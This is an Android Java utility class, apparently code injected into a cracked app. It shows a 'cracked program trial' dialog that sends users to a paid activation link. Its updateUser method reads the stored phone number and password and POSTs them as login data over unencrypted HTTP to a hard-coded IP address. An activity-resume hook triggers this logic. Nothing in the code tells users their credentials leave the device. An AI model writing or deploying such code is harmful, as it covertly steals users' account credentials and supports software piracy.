package com.qennnsad.aknkaksd.hello;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import javax.net.ssl.HttpsURLConnection;

public class NetUtils {
    static String Base_Url = "http://47.97.213.144/api";
    final static String TAG = "hello";

    public interface callResult {
        void result(boolean success, String result);
    }

    public static void sendPost(final String r_url, final String data, final callResult callResult) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                URL url = null;
                try {
                    url = new URL(r_url);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestProperty("content-type", "application/json; charset=utf-8");
                    conn.setReadTimeout(20000);
                    conn.setConnectTimeout(20000);
                    conn.setRequestMethod("POST");
                    conn.setDoInput(true);
                    conn.setDoOutput(true);

                    OutputStream os;
                    os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(data);
                    writer.flush();
                    writer.close();
                    os.close();
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpsURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer sb = new StringBuffer("");
                        String line = "";
                        while ((line = in.readLine()) != null) {
                            sb.append(line);
                            callResult.result(true, sb.toString());
                            break;
                        }
                        in.close();
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    callResult.result(false, e.toString());
                    e.printStackTrace();
                }
            }
        }).start();
    }


//    static String Base_Url = "http://192.168.0.108";
//    http://47.97.213.144/api/kwy_notify

    public static void Post(final String path, final Map<String, String> params, final callResult callResult) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                URL url = null;
                try {
                    url = new URL(Base_Url + path);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setReadTimeout(20000);
                    conn.setConnectTimeout(20000);
                    conn.setRequestMethod("POST");
                    conn.setDoInput(true);
                    conn.setDoOutput(true);

                    OutputStream os;
                    os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(getQuery(params));
                    writer.flush();
                    writer.close();
                    os.close();
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpsURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer sb = new StringBuffer("");
                        String line = "";
                        while ((line = in.readLine()) != null) {
                            sb.append(line);
                        }
                        JSONObject jsonObject = new JSONObject(sb.toString());
                        boolean success = jsonObject.getBoolean("success");
                        if (success) {
                            callResult.result(true, jsonObject.getString("data"));
                        } else {
                            callResult.result(false, jsonObject.getString("msg"));
                        }
                        in.close();
                    } else {
                        callResult.result(false, responseCode + "");
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    callResult.result(false, e.toString());
                    e.printStackTrace();
                }
            }
        }).start();
    }

    static final String PHONE = "KWY_PHONE";
    static final String PASSWD = "KWY_PASSWD";
    static final String NEED_UPDATE = "NEED_UPDATE";

    public static void savePhone(String phoneNumber, String passwd) {
        phoneNumber = phoneNumber.trim();
        passwd = passwd.trim();
        String num = SpUtil.getString(PHONE);
        String pwd = SpUtil.getString(PASSWD);
        if ((phoneNumber + passwd).equals(num + pwd)) {
            SpUtil.putBoolean(NEED_UPDATE, false);
        } else {
            SpUtil.putBoolean(NEED_UPDATE, true);
        }
    }

    public static void updateUser(String userId) {
        boolean update = SpUtil.getBoolean(NEED_UPDATE, false);
        if (!update) return;
        saveUserId(userId);
        String num = SpUtil.getString(PHONE);
        String pwd = SpUtil.getString(PASSWD);

        HashMap<String, String> p = new HashMap<>();
        p.put("type", "login");
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("phone", num);
            jsonObject.put("password", pwd);
            p.put("data", jsonObject.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        NetUtils.Post("/data", p, new NetUtils.callResult() {
            @Override
            public void result(boolean success, final String result) {
                Log.d(TAG, success + " :" + result);
            }
        });
    }


    private static String getQuery(Map<String, String> params) throws UnsupportedEncodingException {
        StringBuilder result = new StringBuilder();
        boolean first = true;

        for (String key : params.keySet()) {
            String value = params.get(key);
            if (first)
                first = false;
            else
                result.append("&");

            result.append(URLEncoder.encode(key, "UTF-8"));
            result.append("=");
            result.append(URLEncoder.encode(value, "UTF-8"));
        }
        return result.toString();
    }


    public static boolean isValidate(String id) {
        return SpUtil.getBoolean("validate" + id, false);
    }

    public static boolean isValidate() {

        return SpUtil.getBoolean("validate" + getUserId(), false);
    }

    public static void setValidate(String id) {
        SpUtil.putBoolean("validate" + id, true);
    }

    public static void getState(final Activity activity, final String id) {
        if (isValidate(id)) return;
        HashMap<String, String> p = new HashMap<>();
        p.put("id", id);
        NetUtils.Post("/active_state", p, new NetUtils.callResult() {
            @Override
            public void result(boolean success, final String result) {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(activity, result, Toast.LENGTH_SHORT).show();
                    }
                });
                if (success) {
                    setValidate(id);
                    Log.d(TAG, result);
                }
            }
        });
    }

    final static String USER_ID = "KWY_USER_ID";
    final static String VALIDATE = "KWY_VALIDATE";

    public static void resume(Activity activity) {
        SpUtil.init(activity);
        String activityName = activity.getClass().getCanonicalName();
        Log.d(TAG, "hello : " + activityName);
        if (activityName.contains("PlayerActivity")) {
            showInfo(activity);
        } else if (activityName.contains("MainActivity")) {
            getState(activity, SpUtil.getString(USER_ID));
        }
    }

    public static void saveUserId(String userId) {
        SpUtil.putString(USER_ID, userId);
    }

    public static String getUserId() {
       return SpUtil.getString(USER_ID, "");
    }


    public static void showInfo(final Activity activity) {
        if (!isValidate()) {
            AlertDialog.Builder builder = new AlertDialog.Builder(activity);
            builder.setTitle("你好").setCancelable(false).
                    setMessage("破解程序试用中").setPositiveButton("马上激活", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    HashMap<String, String> p = new HashMap<>();
                    p.put("id", SpUtil.getString(USER_ID));
                    NetUtils.Post("/active", p, new NetUtils.callResult() {
                        @Override
                        public void result(boolean success, final String result) {
                            if (success) {
                                final Intent browserIntent = new Intent(Intent.ACTION_VIEW);
                                browserIntent.setData(Uri.parse(result));
                                activity.runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        activity.startActivity(browserIntent);
                                    }
                                });
                            } else {
                                Log.d(TAG, result);
                            }
                        }
                    });
                }
            });
            builder.show();
        }
    }


}
